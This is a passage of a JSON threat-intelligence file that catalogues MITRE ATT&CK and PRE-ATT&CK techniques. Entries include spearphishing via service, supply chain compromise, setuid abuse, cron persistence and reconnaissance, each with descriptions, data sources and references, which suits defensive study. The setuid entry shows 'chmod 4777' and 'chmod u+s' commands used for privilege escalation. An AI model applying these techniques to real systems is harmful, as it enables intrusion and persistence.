      "description": "Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.\n\nA common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.",
      "meta": {
        "external_id": "CAPEC-163",
        "kill_chain": [
          "mitre-attack:initial-access"
        ],
        "mitre_data_sources": [
          "SSL/TLS inspection",
          "Anti-virus",
          "Web proxy"
        ],
        "mitre_platforms": [
          "Windows",
          "macOS",
          "Linux"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1194",
          "https://capec.mitre.org/data/definitions/163.html"
        ]
      },
      "uuid": "d3df754e-997b-4cf9-97d4-70feb3120847",
      "value": "Spearphishing via Service - T1194"
    },
    {
      "description": "Supply chain compromise is the manipulation of products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise. \n\nSupply chain compromise can take place at any stage of the supply chain including:\n\n* Manipulation of development tools\n* Manipulation of a development environment\n* Manipulation of source code repositories (public or private)\n* Manipulation of source code in open-source dependencies\n* Manipulation of software update/distribution mechanisms\n* Compromised/infected system images (multiple cases of removable media infected at the factory) (Citation: IBM Storwize) (Citation: Schneider Electric USB Malware) \n* Replacement of legitimate software with modified versions\n* Sales of modified/counterfeit products to legitimate distributors\n* Shipment interdiction\n\nWhile supply chain compromise can impact any component of hardware or software, attackers looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels. (Citation: Avast CCleaner3 2018) (Citation: Microsoft Dofoil 2018) (Citation: Command Five SK 2011) Targeting may be specific to a desired victim set (Citation: Symantec Elderwood Sept 2012) or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. (Citation: Avast CCleaner3 2018) (Citation: Command Five SK 2011) Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency. (Citation: Trendmicro NPM Compromise)",
      "meta": {
        "external_id": "CAPEC-439",
        "kill_chain": [
          "mitre-attack:initial-access"
        ],
        "mitre_data_sources": [
          "Web proxy",
          "File monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "Windows",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1195",
          "https://capec.mitre.org/data/definitions/437.html",
          "https://capec.mitre.org/data/definitions/438.html",
          "https://capec.mitre.org/data/definitions/439.html",
          "https://www-01.ibm.com/support/docview.wss?uid=ssg1S1010146&myns=s028&mynp=OCSTHGUJ&mynp=OCSTLM5A&mynp=OCSTLM6B&mynp=OCHW206&mync=E&cm_sp=s028-_-OCSTHGUJ-OCSTLM5A-OCSTLM6B-OCHW206-_-E",
          "https://www.schneider-electric.com/en/download/document/SESN-2018-236-01/",
          "https://blog.avast.com/new-investigations-in-ccleaner-incident-point-to-a-possible-third-stage-that-had-keylogger-capacities",
          "https://cloudblogs.microsoft.com/microsoftsecure/2018/03/07/behavior-monitoring-combined-with-machine-learning-spoils-a-massive-dofoil-coin-mining-campaign/",
          "https://www.commandfive.com/papers/C5_APT_SKHack.pdf",
          "http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/the-elderwood-project.pdf",
          "https://www.trendmicro.com/vinfo/dk/security/news/cybercrime-and-digital-threats/hacker-infects-node-js-package-to-steal-from-bitcoin-wallets"
        ]
      },
      "uuid": "3f18edba-28f4-4bb9-82c3-8aa60dcac5f7",
      "value": "Supply Chain Compromise - T1195"
    },
    {
      "description": "When the setuid or setgid bits are set on Linux or macOS for an application, this means that the application will run with the privileges of the owning user or group respectively  (Citation: setuid man page). Normally an application is run in the current user’s context, regardless of which user or group owns the application. There are instances where programs need to be executed in an elevated context to function properly, but the user running them doesn’t need the elevated privileges. Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications. These bits are indicated with an \"s\" instead of an \"x\" when viewing a file's attributes via <code>ls -l</code>. The <code>chmod</code> program can set these bits with via bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>.\n\nAn adversary can take advantage of this to either do a shell escape or exploit a vulnerability in an application with the setsuid or setgid bits to get code running in a different user’s context. Additionally, adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future  (Citation: OSX Keydnap malware).",
      "meta": {
        "external_id": "T1166",
        "kill_chain": [
          "mitre-attack:privilege-escalation",
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1166",
          "http://man7.org/linux/man-pages/man2/setuid.2.html",
          "https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/"
        ]
      },
      "uuid": "c0df6533-30ee-4a4a-9c6d-17af5abdf0b2",
      "value": "Setuid and Setgid - T1166"
    },
    {
      "description": "On Linux and macOS systems, multiple methods are supported for creating pre-scheduled and periodic background jobs: cron, (Citation: Die.net Linux crontab Man Page) at, (Citation: Die.net Linux at Man Page) and launchd. (Citation: AppleDocs Scheduling Timed Jobs) Unlike [Scheduled Task](https://attack.mitre.org/techniques/T1053) on Windows systems, job scheduling on Linux-based systems cannot be done remotely unless used in conjunction within an established remote session, like secure shell (SSH).\n\n### cron\n\nSystem-wide cron jobs are installed by modifying <code>/etc/crontab</code> file, <code>/etc/cron.d/</code> directory or other locations supported by the Cron daemon, while per-user cron jobs are installed using crontab with specifically formatted crontab files. (Citation: AppleDocs Scheduling Timed Jobs) This works on macOS and Linux systems.\n\nThose methods allow for commands or scripts to be executed at specific, periodic intervals in the background without user interaction. An adversary may use job scheduling to execute programs at system startup or on a scheduled basis for Persistence, (Citation: Janicab) (Citation: Methods of Mac Malware Persistence) (Citation: Malware Persistence on OS X) (Citation: Avast Linux Trojan Cron Persistence) to conduct Execution as part of Lateral Movement, to gain root privileges, or to run a process under the context of a specific account.\n\n### at\n\nThe at program is another means on POSIX-based systems, including macOS and Linux, to schedule a program or script job for execution at a later date and/or time, which could also be used for the same purposes.\n\n### launchd\n\nEach launchd job is described by a different configuration property list (plist) file similar to [Launch Daemon](https://attack.mitre.org/techniques/T1160) or [Launch Agent](https://attack.mitre.org/techniques/T1159), except there is an additional key called <code>StartCalendarInterval</code> with a dictionary of time values. (Citation: AppleDocs Scheduling Timed Jobs) This only works on macOS and OS X.",
      "meta": {
        "external_id": "T1168",
        "kill_chain": [
          "mitre-attack:persistence",
          "mitre-attack:execution"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1168",
          "https://linux.die.net/man/5/crontab",
          "https://linux.die.net/man/1/at",
          "https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/ScheduledJobs.html",
          "http://www.thesafemac.com/new-signed-malware-called-janicab/",
          "https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf",
          "https://www.rsaconference.com/writable/presentations/file_upload/ht-r03-malware-persistence-on-os-x-yosemite_final.pdf",
          "https://blog.avast.com/2015/01/06/linux-ddos-trojan-hiding-itself-with-an-embedded-rootkit/"
        ]
      },
      "uuid": "c0a384a4-9a25-40e1-97b6-458388474bc8",
      "value": "Local Job Scheduling - T1168"
    },
    {
      "description": "Windows Control Panel items are utilities that allow users to view and adjust computer settings. Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a CPlApplet function. (Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014) Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file. (Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014) (Citation: TrendMicro CPL Malware Dec 2013)\n\nFor ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel. (Citation: Microsoft Implementing CPL)\n\nAdversaries can use Control Panel items as execution payloads to execute arbitrary commands. Malicious Control Panel items can be delivered via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) campaigns (Citation: TrendMicro CPL Malware Jan 2014) (Citation: TrendMicro CPL Malware Dec 2013) or executed as part of multi-stage malware. (Citation: Palo Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also bypass application and/or file extension whitelisting.",
      "meta": {
        "external_id": "T1196",
        "kill_chain": [
          "mitre-attack:defense-evasion",
          "mitre-attack:execution"
        ],
        "mitre_data_sources": [
          "API monitoring",
          "Binary file metadata",
          "DLL monitoring",
          "Windows Registry",
          "Windows event logs",
          "Process command-line parameters",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1196",
          "https://msdn.microsoft.com/library/windows/desktop/cc144185.aspx",
          "https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf",
          "https://blog.trendmicro.com/trendlabs-security-intelligence/control-panel-files-used-as-malicious-attachments/",
          "https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered/"
        ]
      },
      "uuid": "8df54627-376c-487c-a09c-7d2b5620f56e",
      "value": "Control Panel Items - T1196"
    },
    {
      "description": "Command and Control (C2 or C&C) is a method by which the adversary communicates with malware. An adversary may use a variety of protocols and methods to execute C2 such as a centralized server, peer to peer, IRC, compromised web sites, or even social media. (Citation: HAMMERTOSS2015)",
      "meta": {
        "external_id": "T1352",
        "kill_chain": [
          "mitre-pre-attack:build-capabilities"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1352"
        ]
      },
      "uuid": "8e211ec9-5dfc-4915-aff4-84d5908f0336",
      "value": "C2 protocol development - T1352"
    },
    {
      "description": "Compiled HTML files (.chm) are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program)\n\nAdversaries may abuse this technology to conceal malicious code. A custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application whitelisting on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)",
      "meta": {
        "external_id": "T1223",
        "kill_chain": [
          "mitre-attack:defense-evasion",
          "mitre-attack:execution"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1223",
          "https://docs.microsoft.com/previous-versions/windows/desktop/htmlhelp/microsoft-html-help-1-4-sdk",
          "https://msdn.microsoft.com/windows/desktop/ms644670",
          "https://msdn.microsoft.com/windows/desktop/ms524405",
          "https://msitpros.com/?p=3909",
          "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8625"
        ]
      },
      "uuid": "d21a2069-23d5-4043-ad6d-64f6b644cb1a",
      "value": "Compiled HTML File - T1223"
    },
    {
      "description": "Implementation plans specify how the goals of the strategic plan will be executed. (Citation: ChinaCollectionPlan) (Citation: OrderOfBattle)",
      "meta": {
        "external_id": "T1232",
        "kill_chain": [
          "mitre-pre-attack:priority-definition-planning"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1232"
        ]
      },
      "uuid": "b355817c-cf63-43b4-94a4-05e9645fa910",
      "value": "Create implementation plan - T1232"
    },
    {
      "description": "If going from strategic down to tactical or vice versa, an  adversary would next consider the operational element.  For example, the specific company within an industry or agency within a government. (Citation: CyberAdversaryBehavior) (Citation: JP3-60) (Citation: JP3-12R) (Citation: DoD Cyber 2015)",
      "meta": {
        "external_id": "T1242",
        "kill_chain": [
          "mitre-pre-attack:target-selection"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1242"
        ]
      },
      "uuid": "c860af4a-376e-46d7-afbf-262c41012227",
      "value": "Determine operational element - T1242"
    },
    {
      "description": "Leadership identifies gap areas that generate a compelling need to generate a Key Intelligence Topic (KIT) or Key Intelligence Question (KIQ). (Citation: ODNIIntegration) (Citation: ICD115)",
      "meta": {
        "external_id": "T1225",
        "kill_chain": [
          "mitre-pre-attack:priority-definition-planning"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1225"
        ]
      },
      "uuid": "d778cb83-2292-4995-b006-d38f52bc1e64",
      "value": "Identify gap areas - T1225"
    },
    {
      "description": "A network topology is the arrangement of the various elements of a network (e.g., servers, workstations, printers, routers, firewalls, etc.). Mapping a network allows an adversary to understand how the elements are connected or related. (Citation: man traceroute) (Citation: Shodan Tutorial)",
      "meta": {
        "external_id": "T1252",
        "kill_chain": [
          "mitre-pre-attack:technical-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1252"
        ]
      },
      "uuid": "cdfdb0cd-a839-403c-9dd6-8a85d8c5c73d",
      "value": "Map network topology - T1252"
    },
    {
      "description": "Client configurations information such as the operating system and web browser, along with additional information such as version or language, are often transmitted as part of web browsing communications.  This can be accomplished in several ways including use of a compromised web site to collect details on visiting computers. (Citation: UnseenWorldOfCookies) (Citation: Panopticlick)",
      "meta": {
        "external_id": "T1262",
        "kill_chain": [
          "mitre-pre-attack:technical-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1262"
        ]
      },
      "uuid": "78ae433b-289d-4c8d-b8c1-f8de0b7f9090",
      "value": "Enumerate client configurations - T1262"
    },
    {
      "description": "Business relationship information includes the associates of a target and may be discovered via social media sites such as [LinkedIn](https://www.linkedin.com) or public press releases announcing new partnerships between organizations or people (such as key hire announcements in industry articles).  This information may be used by an adversary to shape social engineering attempts (exploiting who a target expects to hear from) or to plan for technical actions such as exploiting network trust relationship. (Citation: RSA-APTRecon) (Citation: Scasny2015)",
      "meta": {
        "external_id": "T1272",
        "kill_chain": [
          "mitre-pre-attack:people-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1272"
        ]
      },
      "related": [
        {
          "dest-uuid": "73e7d7d5-1782-4cd0-a4d7-00c7ec051c2a",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "5b6ce031-bb86-407a-9984-2b9700ac4549",
      "value": "Identify business relationships - T1272"
    },
    {
      "description": "Physical locality information may be used by an adversary to shape social engineering attempts (language, culture, events, weather, etc.) or to plan for physical actions such as dumpster diving or attempting to access a facility. (Citation: RSA-APTRecon)",
      "meta": {
        "external_id": "T1282",
        "kill_chain": [
          "mitre-pre-attack:organizational-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1282"
        ]
      },
      "uuid": "2011ffeb-8003-41ef-b962-9d1cbfa35e6d",
      "value": "Determine physical locations - T1282"
    },
    {
      "description": "An adversary can test the detections of malicious emails or files by using  publicly available services, such as virus total, to see if their files or emails cause an alert. They can also use similar services that are not openly available and don't publicly publish results or they can test on their own internal infrastructure. (Citation: WiredVirusTotal)",
      "meta": {
        "external_id": "T1292",
        "kill_chain": [
          "mitre-pre-attack:technical-weakness-identification"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1292"
        ]
      },
      "uuid": "57061a8a-d7c5-42a9-be60-f79526b95bf6",
      "value": "Test signature detection - T1292"
    },
    {
      "description": "An adversary could call standard operating system APIs from a malicious application to gather contact list (i.e., address book) data, or with escalated privileges could directly access files containing contact list data.",
      "meta": {
        "external_id": "APP-13",
        "kill_chain": [
          "mitre-mobile-attack:collection"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1432",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-13.html"
        ]
      },
      "uuid": "4e6620ac-c30c-4f6d-918e-fa20cae7c1ce",
      "value": "Access Contact List - T1432"
    },
    {
      "description": "Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans from the mobile device. This technique may take advantage of the mobile device's access to an internal enterprise network either through local connectivity or through a Virtual Private Network (VPN).",
      "meta": {
        "external_id": "T1423",
        "kill_chain": [
          "mitre-mobile-attack:discovery"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1423"
        ]
      },
      "uuid": "2de38279-043e-47e8-aaad-1b07af6d0790",
      "value": "Network Service Scanning - T1423"
    },
    {
      "description": "Malicious applications may attempt to detect their operating environment prior to fully executing their payloads. These checks are often used to ensure the application is not running within an analysis environment such as a sandbox used for application vetting, security research, or reverse engineering. \nAdversaries may use many different checks such as physical sensors, location, and system properties to fingerprint emulators and sandbox environments.(Citation: Talos Gustuff Apr 2019)(Citation: ThreatFabric Cerberus)(Citation: Xiao-ZergHelper)(Citation: Cyberscoop Evade Analysis January 2019) Adversaries may access `android.os.SystemProperties` via Java reflection to obtain specific system information.(Citation: Github Anti-emulator) Standard values such as phone number, IMEI, IMSI, device IDs, and device drivers may be checked against default signatures of common sandboxes.(Citation: Sophos Anti-emulation)\n",
      "meta": {
        "external_id": "T1523",
        "kill_chain": [
          "mitre-mobile-attack:defense-evasion",
          "mitre-mobile-attack:discovery"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1523",
          "https://blog.talosintelligence.com/2019/04/gustuff-targets-australia.html",
          "https://www.threatfabric.com/blogs/cerberus-a-new-banking-trojan-from-the-underworld.html",
          "http://researchcenter.paloaltonetworks.com/2016/02/pirated-ios-app-stores-client-successfully-evaded-apple-ios-code-review/",
          "https://www.cyberscoop.com/android-malware-motion-detection-trend-micro/",
          "https://github.com/strazzere/anti-emulator",
          "https://news.sophos.com/en-us/2017/04/13/android-malware-anti-emulation-techniques/"
        ]
      },
      "uuid": "786f488c-cb1f-4602-89c5-86d982ee326b",
      "value": "Evade Analysis Environment - T1523"
    },
    {
      "description": "Passive scanning is the act of looking at existing network traffic in order to identify information about the communications system. (Citation: SurveyDetectionStrategies) (Citation: CyberReconPaper)",
      "meta": {
        "external_id": "T1253",
        "kill_chain": [
          "mitre-pre-attack:technical-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1253"
        ]
      },
      "uuid": "a7c620e5-cbc9-41b2-9695-418ef560f16c",
      "value": "Conduct passive scanning - T1253"
    },
    {
      "description": "A technique in which a fully qualified domain name has multiple IP addresses assigned to it which are swapped with extreme frequency, using a combination of round robin IP address and short Time-To-Live (TTL) for a DNS resource record. (Citation: HoneynetFastFlux) (Citation: MisnomerFastFlux) (Citation: MehtaFastFluxPt1) (Citation: MehtaFastFluxPt2)",
      "meta": {
        "external_id": "T1325",
        "kill_chain": [
          "mitre-pre-attack:adversary-opsec"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1325"
        ]
      },
      "uuid": "248cbfdd-fec4-451b-b2a9-e46d4b268e30",
      "value": "Fast Flux DNS - T1325"
    },
    {
      "description": "Domain Registration Hijacking is the act of changing the registration of a domain name without the permission of the original registrant. (Citation: ICANNDomainNameHijacking)",
      "meta": {
        "external_id": "T1326",
        "kill_chain": [
          "mitre-pre-attack:establish-&-maintain-infrastructure"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1326"
        ]
      },
      "uuid": "aadaee0d-794c-4642-8293-7ec22a99fb1a",
      "value": "Domain registration hijacking - T1326"
    },
    {
      "description": "An adversary may research available open source information about a target commonly found on social media sites such as [Facebook](https://www.facebook.com), [Instagram](https://www.instagram.com), or [Pinterest](https://www.pinterest.com).  Social media is public by design and provides insight into the interests and potentially inherent weaknesses of a target for exploitation by the adversary. (Citation: RSA-APTRecon)",
      "meta": {
        "external_id": "T1273",
        "kill_chain": [
          "mitre-pre-attack:people-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1273"
        ]
      },
      "uuid": "695b1cce-57d7-49ae-a2af-820d50153f12",
      "value": "Mine social media - T1273"
    },
    {
      "description": "Domain Names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free. (Citation: PWCSofacy2014)",
      "meta": {
        "external_id": "T1328",
        "kill_chain": [
          "mitre-pre-attack:establish-&-maintain-infrastructure"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1328"
        ]
      },
      "uuid": "45242287-2964-4a3e-9373-159fad4d8195",
      "value": "Buy domain name - T1328"
    },
    {
      "description": "Business relationship information may be used by an adversary to shape social engineering attempts (exploiting who a target expects to hear from) or to plan for technical actions such as exploiting network trust relationship. (Citation: 11StepsAttackers)",
      "meta": {
        "external_id": "T1283",
        "kill_chain": [
          "mitre-pre-attack:organizational-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1283"
        ]
      },
      "related": [
        {
          "dest-uuid": "5b6ce031-bb86-407a-9984-2b9700ac4549",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "73e7d7d5-1782-4cd0-a4d7-00c7ec051c2a",
      "value": "Identify business relationships - T1283"
    },
    {
      "description": "An adversary could use fake identities, payment cards, etc., to create developer accounts to publish malicious applications to app stores. For example, Oberheide and Miller describe use of this technique in  (Citation: Oberheide-Bouncer).\n\nPlatforms: Android, iOS",
      "meta": {
        "external_id": "T1442",
        "refs": [
          "https://attack.mitre.org/techniques/T1442"
        ]
      },
      "related": [
        {
          "dest-uuid": "d9db3d46-66ca-44b4-9daa-1ef97cb7465a",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "revoked-by"
        }
      ],
      "uuid": "e30cc912-7ea1-4683-9219-543b86cbdec9",
      "value": "Fake Developer Accounts - T1442"
    },
    {
      "description": "Active scanning is the act of sending transmissions to end nodes, and analyzing the responses, in order to identify information about the communications system. (Citation: RSA-APTRecon)",
      "meta": {
        "external_id": "T1254",
        "kill_chain": [
          "mitre-pre-attack:technical-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1254"
        ]
      },
      "uuid": "7f2d3da6-7e34-44a3-9e7f-905455339726",
      "value": "Conduct active scanning - T1254"
    },
    {
      "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, and architecture.\n\nOn Android, much of this information is programmatically accessible to applications through the android.os.Build class(Citation: Android-Build).\n\nOn iOS, techniques exist for applications to programmatically access this information(Citation: StackOverflow-iOSVersion).",
      "meta": {
        "external_id": "T1426",
        "kill_chain": [
          "mitre-mobile-attack:discovery"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1426",
          "https://developer.android.com/reference/android/os/Build",
          "http://stackoverflow.com/questions/7848766/how-can-we-programmatically-detect-which-ios-version-is-device-running-on"
        ]
      },
      "uuid": "e2ea7f6b-8d4f-49c3-819d-660530d12b77",
      "value": "System Information Discovery - T1426"
    },
    {
      "description": "Supply chains include the people, processes, and technologies used to move a product or service from a supplier to a consumer. Understanding supply chains may provide an adversary with opportunities to exploit the technology or interconnections that are part of the supply chain. (Citation: SmithSupplyChain) (Citation: CERT-UKSupplyChain) (Citation: RSA-supply-chain)",
      "meta": {
        "external_id": "T1246",
        "kill_chain": [
          "mitre-pre-attack:technical-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1246"
        ]
      },
      "related": [
        {
          "dest-uuid": "59369f72-3005-4e54-9095-3d00efcece73",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        },
        {
          "dest-uuid": "7860e21e-7514-4a3f-8a9d-56405ccfdb0c",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "78e41091-d10d-4001-b202-89612892b6ff",
      "value": "Identify supply chains - T1246"
    },
    {
      "description": "Adversaries may attempt to gather information on domain trust relationships that may be used to identify [Lateral Movement](https://attack.mitre.org/tactics/TA0008) opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1178), [Pass the Ticket](https://attack.mitre.org/techniques/T1097), and [Kerberoasting](https://attack.mitre.org/techniques/T1208).(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the DSEnumerateDomainTrusts() Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)",
      "meta": {
        "external_id": "T1482",
        "kill_chain": [
          "mitre-attack:discovery"
        ],
        "mitre_data_sources": [
          "PowerShell logs",
          "API monitoring",
          "Process command-line parameters",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1482",
          "https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759554(v=ws.10)",
          "https://adsecurity.org/?p=1588",
          "http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/ ",
          "https://www.microsoft.com/security/blog/2017/05/04/windows-defender-atp-thwarts-operation-wilysupply-software-supply-chain-cyberattack/",
          "https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectory.domain.getalltrustrelationships?redirectedfrom=MSDN&view=netframework-4.7.2#System_DirectoryServices_ActiveDirectory_Domain_GetAllTrustRelationships"
        ]
      },
      "uuid": "767dbf9e-df3f-45cb-8998-4903ab5f80c0",
      "value": "Domain Trust Discovery - T1482"
    },
    {
      "description": "Adversaries may attempt to exploit enterprise servers, workstations, or other resources over the network. This technique may take advantage of the mobile device's access to an internal enterprise network either through local connectivity or through a Virtual Private Network (VPN).",
      "meta": {
        "external_id": "APP-32",
        "kill_chain": [
          "mitre-mobile-attack:lateral-movement"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1428",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-32.html"
        ]
      },
      "uuid": "22379609-a99f-4a01-bd7e-70f3e105859d",
      "value": "Exploit Enterprise Resources - T1428"
    },
    {
      "description": "Social Engineering is the practice of manipulating people in order to get them to divulge information or take an action. (Citation: SEAttackVectors) (Citation: BeachSE2003)",
      "meta": {
        "external_id": "T1249",
        "kill_chain": [
          "mitre-pre-attack:technical-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1249"
        ]
      },
      "related": [
        {
          "dest-uuid": "af358cad-eb71-4e91-a752-236edc237dae",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        },
        {
          "dest-uuid": "a757670d-d600-48d9-8ae9-601d42c184a5",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "74a3288e-eee9-4f8e-973a-fbc128e033f1",
      "value": "Conduct social engineering - T1249"
    },
    {
      "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
      "meta": {
        "external_id": "T1492",
        "kill_chain": [
          "mitre-attack:impact"
        ],
        "mitre_data_sources": [
          "Application logs",
          "File monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1492",
          "https://content.fireeye.com/apt/rpt-apt38",
          "https://www.justice.gov/opa/press-release/file/1092091/download"
        ]
      },
      "uuid": "0bf78622-e8d2-41da-a857-731472d61a92",
      "value": "Stored Data Manipulation - T1492"
    },
    {
